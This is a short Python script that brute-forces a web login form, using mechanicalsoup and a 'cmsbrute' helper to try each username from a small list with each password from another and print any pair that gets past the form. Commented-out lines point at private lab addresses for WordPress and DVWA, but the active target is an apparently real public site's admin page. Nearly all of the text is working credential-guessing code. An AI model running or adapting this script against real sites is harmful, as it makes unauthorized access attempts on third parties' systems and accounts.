import mechanicalsoup
from cmsbrute import core

# URL = "http://192.168.56.103/wordpress/wp-login.php"
# URL = "http://192.168.56.103/dvwa/login.php"
URL = "http://timbus.vn/admin/"
usrlist = ["user", "admin"]
passlist = ["admin", "password", "12341234"]
# CHECK FOR LOGIN FORM
browser = mechanicalsoup.StatefulBrowser()
browser.open(URL)
print(browser.get_url())
result = core.getLoginForm(browser)
browser.close()

if not result:
	print("[x] Get login form error")
else:
	formID, formUser, formPass = result
	
	for username in usrlist:
		for password in passlist:
			# CREATE NEW BROWSER FOR EACH LOGIN. THIS IS A MUST DO
			browser = mechanicalsoup.StatefulBrowser()
			browser.open(URL)
			# FILL FORM WITH VALUES
			browser.select_form(nr = formID)
			browser[formUser] = username
			browser[formPass] = password
			# SUBMIT 
			browser.submit_selected()
			# check condition here
			try:
				# HAS FORM
				check_form = core.getLoginForm(browser)
				if not check_form:
					print("Found: [%s:%s]" %(username, password))
					break
			except mechanicalsoup.utils.LinkNotFoundError:
				# HAS NO FORM
				print("Found: [%s:%s]" %(username, password))
				break
			# ADD MORE CONDITION HERE
			print(browser.get_url())
			print(browser.get_current_page().title.text)
			browser.close()
